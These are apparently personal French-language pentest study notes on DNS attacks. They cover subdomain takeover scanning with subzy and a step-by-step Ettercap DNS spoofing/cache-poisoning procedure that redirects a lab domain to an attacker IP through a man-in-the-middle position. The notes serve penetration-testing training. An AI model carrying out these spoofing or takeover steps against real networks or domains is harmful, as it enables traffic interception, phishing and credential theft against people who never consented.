
- [ ] [[#1. Transfert de Zones 2. DNS **Transfert de Zone**]]
- [ ] [[#2. Bruteforce de sous domaine 2. DNS **Bruteforce de sous-domaines**]]
- [ ] [[#3. Domain / Subdomain TakeOver]]
- [ ] [[#4. DNS SPOOFING / CACHE POISONING(MiTM)]]

---
# 0. Host file location

### *Windows*

```
C:\Windows\System32\drivers\etc\hosts
```
### *Linux*

```
/etc/hosts
```


---

# 1. Transfert de Zones 

[[2. DNS#**Transfert de Zone**]]


---

# 2. Bruteforce de sous domaine

[[2. DNS#**Bruteforce de sous-domaines (si transfert de zone impossible)**]]


---
# 3. Domain / Subdomain TakeOver

> [!TIP]
> Consiste à enregistrer le domaine ou sous-domaine cible lorsqu'il expire pour en prendre le contrôle.

https://github.com/EdOverflow/can-i-take-over-xyz

https://github.com/PentestPad/subzy -> Basé sur can-i-take-over-xyz, permet de scanner une liste de sous-domaines afin de détecter si le TakeOver est possible

```
subzy run --targets list.txt
```

https://www.hackerone.com/blog/guide-subdomain-takeovers


---
# 4. DNS SPOOFING / CACHE POISONING (MiTM)

> [!TIP]
> Consiste à se faire passer pour un serveur DNS et empoisonner le cache DNS de la victime afin de rediriger un nom de domaine vers une IP malveillante.

## *Ettercap*

1. Editer le fichier etter.dns pour y insérer le dns à usurper avec l'IP sur laquelle rediriger la cible.

```sh
sudo vim /etc/ettercap/etter.dns
```

```shell-session
inlanefreight.com      A   192.168.225.110
*.inlanefreight.com    A   192.168.225.110
```

2. Lancer ettercap GUI

```bash
sudo ettercap -G
```

3. Sélectionner l'interface
4. Scanner le réseau pour identifier les hôtes -> Scan for Hosts.
5. Afficher la liste des Hosts et sélectionner la cible en target 1 et la gateway en target 2
6. Aller dans Plugins > Manage plugins et double-cliquer sur dns_spoof 
